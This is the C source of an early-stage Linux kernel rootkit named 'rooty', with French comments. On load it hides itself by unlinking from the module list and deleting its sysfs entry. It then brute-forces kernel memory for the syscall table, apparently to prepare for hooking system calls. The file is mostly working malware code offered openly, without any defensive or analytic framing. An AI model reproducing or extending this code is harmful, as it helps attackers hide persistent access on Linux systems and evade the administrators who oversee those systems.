#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>

/*Etat actuel :
 *Le rootkit masque sa présence, puis recherche
 *l'emplacement de la table d'appels systèmes en
 *mémoire
 */

//On définit le range de recherche en fonction de l'architecture
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif



psize *sys_call_table;

/*Cette fonction recherche la table d'appels 
 *systèmes par force brute (rapide).
 *Elle se base sur un appel système quelconque
 *et essaie de voir pour chaque valeur possible
 *de la table d'appel si il obtient la bonne
 *adresse pour cet appel.
 */
psize **find(void){
  psize **sctable;
  psize i = START_CHECK;
  while(i < END_CHECK){
    sctable = (psize **) i;

    /*__NR_close est une macro contenant la 
     *position de l'appel close dans la table.
     *sys_close est un pointeur vers le code de
     *l'appel close
     */
    if(sctable[__NR_close] == (psize *) sys_close){
      return &sctable[0];
    }
    i += sizeof(void *);
  }
  return NULL;
}

int init_module(void){

  //Suppression du rootkit du fichier /proc/modules
  list_del_init(&__this_module.list);
  //Suppression de la référence vers le dossier /sys/module/rooty dans le File System
  kobject_del(&THIS_MODULE->mkobj.kobj);
  printk(KERN_ALERT "rooty: starting...\n");


  if(sys_call_table = (psize *) find()){
    printk(KERN_ALERT "rooty: sys_call_table found at %p\n", sys_call_table);
  } else {
    printk(KERN_ALERT "rooty: sys_call_table not found\n");
  }

  return 0;
}

void cleanup_module(void){
  printk(KERN_ALERT "rooty: Goodbye\n");
}
